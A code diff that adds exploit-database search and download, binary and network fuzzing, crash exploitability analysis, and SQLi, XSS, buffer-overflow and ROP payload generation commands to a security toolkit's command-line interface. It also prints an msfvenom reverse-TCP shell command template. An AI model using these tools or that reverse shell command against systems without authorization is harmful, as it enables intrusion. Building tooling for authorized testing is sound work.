@@ -3,7 +3,7 @@
 import sys
 import time
 from pathlib import Path
-from typing import List, Optional
+from typing import List, Optional, Dict
 from ascii_art import (
     AKALI_COMPACT, TRAINING_BANNER, VAULT_BANNER,
     DLP_BANNER, HUNT_BANNER, INCIDENT_BANNER,
@@ -311,6 +311,151 @@ class AkaliCLI:
             scanner.print_cve_report(cve_info)
         else:
             print(f"❌ Failed to retrieve information for {cve_id}")
+
+    # Phase 9A: Exploit Database Commands
+
+    def exploit_search(self, query: str, source: str = "all", category: Optional[str] = None):
+        """Search exploit databases.
+
+        Args:
+            query: Search query string
+            source: Source to search (all, exploitdb, github, metasploit)
+            category: Optional category filter
+        """
+        import sys
+        sys.path.append(str(Path.home() / "akali"))
+        from exploits.database.search import ExploitSearch
+
+        searcher = ExploitSearch()
+
+        print(f"\n🥷 Searching exploit databases for: {query}")
+        if category:
+            print(f"   Category filter: {category}\n")
+        else:
+            print()
+
+        if source == "all":
+            results = searcher.search_all(query)
+
+            # Display results by source
+            for source_name, source_results in results.items():
+                if source_results:
+                    print(f"\n📦 {source_name.upper()} ({len(source_results)} results):")
+                    for exploit in source_results[:5]:
+                        self._print_exploit_summary(exploit)
+                    if len(source_results) > 5:
+                        print(f"   ... and {len(source_results) - 5} more results\n")
+
+            total = sum(len(r) for r in results.values())
+            print(f"\n✅ Total: {total} exploits found across all sources")
+
+        else:
+            # Search specific source
+            if source == "exploitdb":
+                results = searcher.search_exploitdb(query)
+            elif source == "github":
+                results = searcher.search_github_pocs(query)
+            elif source == "metasploit":
+                results = searcher.search_metasploit(query)
+
+            if results:
+                print(f"\n📦 Found {len(results)} results:\n")
+                for exploit in results:
+                    self._print_exploit_summary(exploit)
+            else:
+                print("   No results found")
+
+    def exploit_download(self, exploit_id: str, output_path: Optional[str] = None):
+        """Download exploit by ID.
+
+        Args:
+            exploit_id: Exploit identifier (EDB-12345, GitHub URL, etc.)
+            output_path: Optional output path
+        """
+        import sys
+        sys.path.append(str(Path.home() / "akali"))
+        from exploits.database.search import ExploitSearch
+
+        searcher = ExploitSearch()
+
+        # Set default output path
+        if not output_path:
+            # Extract filename from ID
+            if exploit_id.startswith('EDB-'):
+                output_path = f"exploit_{exploit_id}.txt"
+            elif 'github.com' in exploit_id:
+                filename = exploit_id.split('/')[-1]
+                output_path = filename if filename else "exploit.txt"
+            else:
+                output_path = "exploit.txt"
+
+        print(f"\n🥷 Downloading: {exploit_id}")
+        print(f"   Output: {output_path}\n")
+
+        success = searcher.download_exploit(exploit_id, output_path)
+
+        if success:
+            print(f"✅ Downloaded successfully to: {output_path}")
+        else:
+            print(f"❌ Failed to download exploit: {exploit_id}")
+            print("   Check that the ID is correct and the source is available")
+
+    def exploit_list(self, category: Optional[str] = None, platform: Optional[str] = None):
+        """List available exploits.
+
+        Args:
+            category: Optional category filter
+            platform: Optional platform filter
+        """
+        print("\n🥷 Listing exploit categories:\n")
+
+        categories = {
+            "webapp": "Web Application Exploits",
+            "remote": "Remote Code Execution",
+            "local": "Local Privilege Escalation",
+            "dos": "Denial of Service",
+            "windows": "Windows Exploits",
+            "linux": "Linux Exploits",
+            "mobile": "Mobile Application Exploits",
+            "hardware": "Hardware/IoT Exploits"
+        }
+
+        if category:
+            if category in categories:
+                print(f"Category: {categories[category]}\n")
+                print("Use 'akali exploit search <keywords> --category {category}' to search")
+            else:
+                print(f"❌ Unknown category: {category}")
+                print("\nAvailable categories:")
+
+        for cat, desc in categories.items():
+            print(f"  {cat:12} - {desc}")
+
+        print("\n💡 Tip: Use 'akali exploit search <query>' to search for specific exploits")
+
+    def _print_exploit_summary(self, exploit: Dict):
+        """Print exploit summary.
+
+        Args:
+            exploit: Exploit dictionary
+        """
+        title = exploit.get('title', exploit.get('name', 'Unknown'))
+        exploit_id = exploit.get('id', 'N/A')
+        source = exploit.get('source', 'unknown')
+
+        print(f"  [{exploit_id}] {title}")
+
+        if 'url' in exploit:
+            print(f"      URL: {exploit['url']}")
+        if 'stars' in exploit:
+            print(f"      ⭐ {exploit['stars']} stars")
+        if 'description' in exploit and exploit['description']:
+            desc = exploit['description'][:80]
+            print(f"      {desc}{'...' if len(exploit['description']) > 80 else ''}")
+        if 'rank' in exploit:
+            print(f"      Rank: {exploit['rank']}")
+
+        print()
 
     def status(self):
         """Show Akali status and tool availability."""
@@ -1832,3 +1977,382 @@ class AkaliCLI:
 
         if len(secrets) > 20:
             print(f"\n... and {len(secrets) - 20} more secrets")
+
+    # Phase 9A: Fuzzing Framework
+
+    def fuzz_binary(self, binary_path: str, corpus_dir: str, timeout: int = 3600):
+        """Fuzz a binary application."""
+        from exploits.fuzzer import Fuzzer
+        from pathlib import Path
+
+        print("\n🔬 Binary Fuzzing")
+        print("=" * 60)
+
+        binary = Path(binary_path)
+        corpus = Path(corpus_dir)
+
+        # Validate inputs
+        if not binary.exists():
+            print(f"❌ Binary not found: {binary_path}")
+            return
+
+        if not corpus.exists():
+            print(f"❌ Corpus directory not found: {corpus_dir}")
+            return
+
+        print(f"\n[*] Target Binary: {binary_path}")
+        print(f"[*] Corpus Directory: {corpus_dir}")
+        print(f"[*] Timeout: {timeout}s")
+
+        # Count corpus seeds
+        seed_count = len(list(corpus.glob('*')))
+        print(f"[*] Seed Files: {seed_count}")
+
+        fuzzer = Fuzzer()
+
+        # Check if AFL++ is available
+        if fuzzer.binary_fuzzer.check_afl_available():
+            print("\n✅ AFL++ detected - using AFL++ fuzzer")
+        else:
+            print("\n⚠️  AFL++ not available - using Python-based fuzzer")
+            print("   (Install AFL++ for better performance: apt install afl++)")
+
+        print(f"\n🚀 Starting fuzzing (timeout: {timeout}s)...")
+        print("   Press Ctrl+C to stop early\n")
+
+        try:
+            result = fuzzer.fuzz_binary(binary_path, corpus_dir, timeout)
+
+            print("\n📊 Fuzzing Results:")
+            print(f"   Method: {result['method']}")
+            print(f"   Iterations: {result['iterations']:,}")
+            print(f"   Total Crashes: {result['crashes']}")
+            print(f"   Unique Crashes: {result['unique_crashes']}")
+            print(f"   Elapsed Time: {result['elapsed_time']:.2f}s")
+            print(f"   Status: {result['status']}")
+
+            if result.get('crash_dir') and result['crashes'] > 0:
+                print(f"\n💥 Crashes saved to: {result['crash_dir']}")
+                print(f"\nAnalyze crashes with:")
+                print(f"   akali fuzz analyze {result['crash_dir']}")
+
+        except KeyboardInterrupt:
+            print("\n\n⚠️  Fuzzing interrupted by user")
+        except Exception as e:
+            print(f"\n❌ Fuzzing error: {e}")
+
+    def fuzz_network(
+        self,
+        target: str,
+        port: int,
+        protocol: str = 'tcp',
+        iterations: int = 1000,
+        corpus_dir: str = None
+    ):
+        """Fuzz a network service."""
+        from exploits.fuzzer import Fuzzer
+
+        print("\n🌐 Network Fuzzing")
+        print("=" * 60)
+
+        print(f"\n[*] Target: {target}:{port}")
+        print(f"[*] Protocol: {protocol.upper()}")
+        print(f"[*] Iterations: {iterations:,}")
+
+        if corpus_dir:
+            print(f"[*] Using corpus: {corpus_dir}")
+
+        print("\n⚠️  WARNING: Network fuzzing may cause service disruption")
+        print("   Only fuzz systems you own or have permission to test")
+
+        consent = input("\nDo you have authorization to fuzz this target? (yes/no): ")
+        if consent.lower() != "yes":
+            print("❌ Fuzzing cancelled. Authorization required.")
+            return
+
+        fuzzer = Fuzzer()
+
+        print(f"\n🚀 Starting {protocol.upper()} fuzzing...")
+
+        try:
+            result = fuzzer.fuzz_network(
+                target=target,
+                port=port,
+                protocol=protocol,
+                iterations=iterations,
+                corpus_dir=corpus_dir
+            )
+
+            print("\n📊 Fuzzing Results:")
+            print(f"   Protocol: {result['protocol'].upper()}")
+            print(f"   Iterations: {result['iterations']:,}")
+
+            if 'responses' in result:
+                print(f"   Responses: {len(result['responses'])}")
+                print(f"   Unique Responses: {result.get('unique_responses', 0)}")
+
+            if 'anomalies' in result and result['anomalies']:
+                print(f"\n⚠️  Anomalies Detected: {len(result['anomalies'])}")
+                for i, anomaly in enumerate(result['anomalies'][:5], 1):
+                    print(f"   {i}. {anomaly['type']}: {anomaly}")
+
+                if len(result['anomalies']) > 5:
+                    print(f"   ... and {len(result['anomalies']) - 5} more anomalies")
+
+            print(f"\n   Errors: {result.get('errors', 0)}")
+
+            if result.get('errors', 0) > iterations * 0.5:
+                print("\n⚠️  High error rate detected - check target connectivity")
+
+        except KeyboardInterrupt:
+            print("\n\n⚠️  Fuzzing interrupted by user")
+        except Exception as e:
+            print(f"\n❌ Fuzzing error: {e}")
+
+    def fuzz_analyze(self, crash_dir: str, report: bool = False):
+        """Analyze crash files for exploitability."""
+        from exploits.fuzzer import CrashAnalyzer
+        from pathlib import Path
+
+        print("\n🔍 Crash Analysis")
+        print("=" * 60)
+
+        crash_path = Path(crash_dir)
+
+        if not crash_path.exists():
+            print(f"❌ Crash directory not found: {crash_dir}")
+            return
+
+        # Count crash files
+        crash_files = list(crash_path.glob('*'))
+        if not crash_files:
+            print(f"\n✅ No crash files found in {crash_dir}")
+            return
+
+        print(f"\n[*] Analyzing {len(crash_files)} crash files...")
+
+        analyzer = CrashAnalyzer()
+        results = analyzer.analyze_directory(crash_dir)
+
+        if not results:
+            print("✅ No crashes to analyze")
+            return
+
+        # Generate report
+        report_data = analyzer.generate_report(results)
+
+        print("\n📊 Analysis Summary:")
+        print(f"   Total Crashes: {report_data['total_crashes']}")
+        print(f"   Unique Crashes: {report_data['unique_crashes']}")
+        print(f"   Interesting Crashes: {report_data['interesting_crashes']}")
+
+        if report_data['by_exploitability']:
+            print("\n🎯 By Exploitability:")
+            for level in ['high', 'medium', 'low', 'unknown']:
+                count = report_data['by_exploitability'].get(level, 0)
+                if count > 0:
+                    emoji = {'high': '🔴', 'medium': '🟡', 'low': '🔵', 'unknown': '⚪'}
+                    print(f"   {emoji[level]} {level.upper()}: {count}")
+
+        if report_data['by_crash_type']:
+            print("\n🐛 By Crash Type:")
+            for crash_type, count in sorted(report_data['by_crash_type'].items(), key=lambda x: x[1], reverse=True):
+                print(f"   • {crash_type}: {count}")
+
+        # Show interesting crashes
+        interesting = analyzer.filter_interesting(results)
+        if interesting:
+            print(f"\n🔥 Top Interesting Crashes:")
+            prioritized = analyzer.prioritize_crashes(interesting)
+
+            for i, crash in enumerate(prioritized[:5], 1):
+                print(f"\n   {i}. {Path(crash['file']).name}")
+                print(f"      Exploitability: {crash['exploitability'].upper()}")
+                print(f"      Crash Type: {crash['crash_type']}")
+                print(f"      Size: {crash['size']} bytes")
+                print(f"      Hash: {crash['hash'][:16]}...")
+
+            if len(prioritized) > 5:
+                print(f"\n   ... and {len(prioritized) - 5} more interesting crashes")
+
+        if report:
+            # Save detailed report
+            import json
+            report_path = Path(crash_dir) / "analysis_report.json"
+            report_path.write_text(json.dumps({
+                'summary': report_data,
+                'crashes': results
+            }, indent=2))
+
+            print(f"\n📄 Detailed report saved to: {report_path}")
+
+    # Phase 9A: Exploit Payload Generation
+
+    def exploit_generate_sqli(self, db: str, payload_type: str, encoding: Optional[str] = None):
+        """Generate SQL injection payloads."""
+        from exploits.generator.payload_builder import PayloadBuilder
+
+        builder = PayloadBuilder()
+
+        print(f"\n🥷 Generating {db} {payload_type} SQL injection payloads...\n")
+
+        payloads = builder.generate_sql_injection(db, payload_type)
+
+        if encoding:
+            print(f"Encoding: {encoding}\n")
+            payloads = [builder.encode_payload(p, encoding) for p in payloads]
+
+        print(f"Generated {len(payloads)} payloads:\n")
+        for i, payload in enumerate(payloads[:20], 1):
+            print(f"{i}. {payload}")
+
+        if len(payloads) > 20:
+            print(f"\n... and {len(payloads) - 20} more payloads")
+
+        print(f"\n💡 Tip: Use these payloads for manual testing or automated scanners")
+
+    def exploit_generate_xss(self, context: str, xss_type: str, encoding: Optional[str] = None, evasion: bool = False):
+        """Generate XSS payloads."""
+        from exploits.generator.payload_builder import PayloadBuilder
+
+        builder = PayloadBuilder()
+
+        print(f"\n🥷 Generating {context} context {xss_type} XSS payloads...\n")
+
+        payloads = builder.generate_xss(context, xss_type, filter_evasion=evasion)
+
+        if encoding:
+            print(f"Encoding: {encoding}\n")
+            if encoding == "html-entities":
+                from exploits.generator.xss import XSSGenerator
+                gen = XSSGenerator()
+                payloads = [gen.encode_html_entities(p) for p in payloads]
+            elif encoding == "unicode":
+                from exploits.generator.xss import XSSGenerator
+                gen = XSSGenerator()
+                payloads = [gen.encode_unicode(p) for p in payloads]
+            else:
+                payloads = [builder.encode_payload(p, encoding) for p in payloads]
+
+        print(f"Generated {len(payloads)} payloads:\n")
+        for i, payload in enumerate(payloads[:20], 1):
+            print(f"{i}. {payload}")
+
+        if len(payloads) > 20:
+            print(f"\n... and {len(payloads) - 20} more payloads")
+
+        if evasion:
+            print(f"\n💡 Filter evasion enabled - payloads include obfuscation techniques")
+
+    def exploit_generate_bof(self, offset: int, shellcode: str, bad_chars: Optional[str] = None,
+                            ret_addr: Optional[str] = None, output: Optional[str] = None):
+        """Generate buffer overflow exploit."""
+        from exploits.generator.payload_builder import PayloadBuilder
+
+        builder = PayloadBuilder()
+
+        print(f"\n🥷 Generating buffer overflow exploit...\n")
+        print(f"Offset: {offset}")
+        print(f"Shellcode: {shellcode[:50]}..." if len(shellcode) > 50 else f"Shellcode: {shellcode}")
+
+        # Parse bad chars
+        bad_chars_list = None
+        if bad_chars:
+            bad_chars_list = [bytes.fromhex(c.strip()) for c in bad_chars.split(",")]
+            print(f"Bad chars: {', '.join(f'0x{c.hex()}' for c in bad_chars_list)}")
+
+        # Parse return address
+        ret_address = None
+        if ret_addr:
+            ret_address = bytes.fromhex(ret_addr)
+            print(f"Return address: 0x{ret_addr}")
+
+        # Convert shellcode (simplified - in production would support more formats)
+        if shellcode == "reverse_tcp":
+            print("\n⚠️  Note: 'reverse_tcp' shellcode generation requires msfvenom")
+            print("Using NOP sled as placeholder. Generate real shellcode with:")
+            print("  msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\\x00' -f python")
+            shellcode_bytes = b"\x90" * 100  # Placeholder
+        else:
+            # Assume hex string
+            try:
+                shellcode_bytes = bytes.fromhex(shellcode.replace("\\x", "").replace("0x", ""))
+            except ValueError:
+                print("❌ Invalid shellcode format. Use hex string (e.g., '90909090' or '\\x90\\x90\\x90\\x90')")
+                return
+
+        # Generate payload
+        payload = builder.generate_buffer_overflow(
+            offset=offset,
+            shellcode=shellcode_bytes,
+            bad_chars=bad_chars_list,
+            return_address=ret_address
+        )
+
+        print(f"\n✅ Generated payload ({len(payload)} bytes)")
+
+        # Display payload
+        print(f"\nPayload (hex):")
+        print("  " + payload.hex())
+
+        print(f"\nPayload (Python bytes):")
+        print(f"  payload = {repr(payload)}")
+
+        # Save to file if requested
+        if output:
+            from pathlib import Path
+            Path(output).write_bytes(payload)
+            print(f"\n💾 Saved to: {output}")
+
+    def exploit_generate_rop(self, binary: str, goal: str, output: Optional[str] = None):
+        """Generate ROP chain."""
+        from exploits.generator.payload_builder import PayloadBuilder
+        from pathlib import Path
+
+        if not Path(binary).exists():
+            print(f"❌ Binary not found: {binary}")
+            return
+
+        builder = PayloadBuilder()
+
+        print(f"\n🥷 Generating ROP chain for {binary}...\n")
+        print(f"Goal: {goal}")
+
+        # Check protections
+        from exploits.generator.rop import ROPGenerator
+        rop_gen = ROPGenerator()
+        protections = rop_gen.check_protections(binary)
+
+        print(f"\nBinary protections:")
+        for prot, enabled in protections.items():
+            status = "✅ Enabled" if enabled else "❌ Disabled"
+            print(f"  {prot.upper()}: {status}")
+
+        # Generate chain
+        chain = builder.generate_rop_chain(binary)
+
+        if chain is None:
+            print(f"\n⚠️  ROP chain generation failed or not supported")
+            print(f"   This feature requires pwntools and ROPgadget")
+            print(f"   Install with: pip install pwntools ROPgadget")
+
+            # Try to find gadgets anyway
+            gadgets = rop_gen.find_gadgets(binary, max_gadgets=10)
+            if gadgets:
+                print(f"\n📋 Found {len(gadgets)} gadgets (sample):")
+                for g in gadgets[:5]:
+                    print(f"  0x{g['address']:08x}: {g['instructions']}")
+            return
+
+        print(f"\n✅ Generated ROP chain ({len(chain)} bytes)")
+
+        print(f"\nROP chain (hex):")
+        print("  " + chain.hex())
+
+        print(f"\nROP chain (Python bytes):")
+        print(f"  rop_chain = {repr(chain)}")
+
+        # Save to file if requested
+        if output:
+            Path(output).write_bytes(chain)
+            print(f"\n💾 Saved to: {output}")
